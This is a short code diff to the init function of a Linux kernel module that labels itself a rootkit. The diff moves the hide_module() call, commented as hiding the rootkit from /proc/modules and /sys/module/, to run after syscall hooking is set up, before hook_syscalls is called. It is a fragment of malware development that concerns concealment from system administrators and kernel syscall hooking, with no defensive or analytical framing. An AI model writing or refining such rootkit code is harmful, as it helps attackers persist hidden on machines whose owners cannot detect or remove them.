@@ -18,9 +18,6 @@ static int __init rootkit_init(void)
 
     pr_info("[ROOTKIT] Module loading...\n");
 
-    // Hide the rootkit from /proc/modules and /sys/module/
-    hide_module();
-
     // Initialize hooking
     i_err = init_hooking();
 
@@ -28,6 +25,9 @@ static int __init rootkit_init(void)
         pr_err("[ROOTKIT] Failed to initialize hooking\n");
         return i_err;
     }
+
+    // Hide the rootkit from /proc/modules and /sys/module/
+    hide_module();
 
     hook_syscalls(P_SYSCALL_HOOKS);
 
